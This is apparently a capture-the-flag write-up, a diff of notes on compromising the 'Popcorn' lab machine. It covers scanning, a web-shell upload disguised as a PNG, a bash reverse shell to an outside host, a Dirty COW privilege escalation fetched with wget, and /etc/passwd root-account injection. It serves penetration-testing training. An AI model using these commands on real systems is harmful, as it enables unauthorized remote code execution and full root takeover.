@@ -1,0 +1,129 @@
+let's enumerate first
+
+command: sudo rustscan -a 10.10.10.6
+result:
+Nmap scan report for 10.10.10.6
+Host is up, received reset ttl 63 (0.22s latency).
+Scanned at 2023-06-10 00:36:32 EDT for 0s
+
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+command: sudo nmap -sSVC -A -p 22,80 10.10.10.6
+result:
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
+|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
+80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.2.12 (Ubuntu)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Android 2.3.5 (Linux 2.6) (96%), Linux 2.6.17 - 2.6.36 (96%), Linux 2.6.32 (96%), Linux 2.6.17 (95%), AVM FRITZ!Box FON WLAN 7240 WAP (95%), Linux 2.6.30 (95%), Linux 2.6.35 (95%), Linux 2.4.20 (Red Hat 7.2) (95%), Canon imageRUNNER ADVANCE C3320i or C3325 copier (94%), Epson WF-2660 printer (94%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+access: http://10.10.10.6/
+
+command: gobuster dir -u http://10.10.10.6 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o root-med -t 40
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.6
+[+] Method:                  GET
+[+] Threads:                 40
+[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+2023/06/10 00:41:49 Starting gobuster in directory enumeration mode
+===============================================================
+/index                (Status: 200) [Size: 177]
+/test                 (Status: 200) [Size: 47028]
+/torrent              (Status: 301) [Size: 310] [--> http://10.10.10.6/torrent/]
+/rename               (Status: 301) [Size: 309] [--> http://10.10.10.6/rename/]
+Progress: 97077 / 220561 (44.01%)[ERROR] 2023/06/10 00:52:58 [!] Get "http://10.10.10.6/server-status": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+Progress: 220560 / 220561 (100.00%)
+
+access: http://10.10.10.6/test
+take attention:
+file_uploads	On	On
+access: file_uploads	On	On
+
+access: http://10.10.10.6/torrent/
+let's signup then login.
+
+please upload torrent: 
+http://10.10.10.6/torrent/torrents.php?mode=upload
+get torrent file from this: https://www.kali.org/downloads/
+
+please go to browser then edit torrent.
+click edit screenshot and intercept using burpsuite.
+change to this:
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: /torrent/=; saveit_0=1; saveit_1=1; /torrent/torrents.php=; /torrent/index.php=; /torrent/torrents.phpfirsttimeload=0; PHPSESSID=79a903a614633ed7650aee31dcfb4427
+Connection: close
+
+------WebKitFormBoundary8IH0OqprrpgLMl4D
+Content-Disposition: form-data; name="file"; filename="cmd.php"
+Content-Type: image/png
+
+<?php system($_REQUEST["cmd"]); ?>
+
+------WebKitFormBoundary8IH0OqprrpgLMl4D
+Content-Disposition: form-data; name="submit"
+
+Submit Screenshot
+------WebKitFormBoundary8IH0OqprrpgLMl4D--
+
+command: curl http://10.10.10.6/torrent/upload/8d0008017a4b3a86e19c3b85082294578ad1fa74.php?cmd=id
+result:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+command: nc -lvnp 7979
+command: curl http://10.10.10.6/torrent/upload/8d0008017a4b3a86e19c3b85082294578ad1fa74.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.14/7979 0>&1'"
+
+command: id && whoami
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+upgrade shell
+command: python -c 'import pty;pty.spawn("/bin/bash")'
+command: cd /home/george
+command: cat user.txt
+result:
+8d3621d99fdbaaeb9f1d176a4a4bf54c
+
+command: uname -r
+2.6.31-14-generic-pae
+search dirty cow exploit:
+https://www.exploit-db.com/exploits/40839
+access exploit: https://github.com/FireFart/dirtycow/blob/master/dirty.c
+
+host>  wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
+upload to target machine.
+kali> gcc -pthread dirty.c -o dirty -lcrypt
+gcc -pthread dirty.c -o dirty -lcrypt
+kali> chmod +x dirty
+kali> ./dirty
+
+kali>  su - firefart
+passowrd: [just enter]
+kali> id && whoami
+uid=0(firefart) gid=0(root) groups=0(root)
+firefart
+kali> cat /root/root.txt
+549f1115840761ef8d479aa36c30e54c
+
+resource:
+https://0xdf.gitlab.io/2020/06/23/htb-popcorn.html#dirty-cow
+
+www-data@popcorn:/var/www$ echo 'oxdf:$1$sWwJSjdl$vj3sfStwX82SUTKJDoYhI1:0:0:pwned:/root:/bin/bash' >> /etc/passwd  
+
+echo 'oxdf:$1$rA2K8zqK$QXg8lJqVTJfQDBrKJFTf1.:0:0:pwned:/root:/bin/bash' >> /etc/passwd  
+
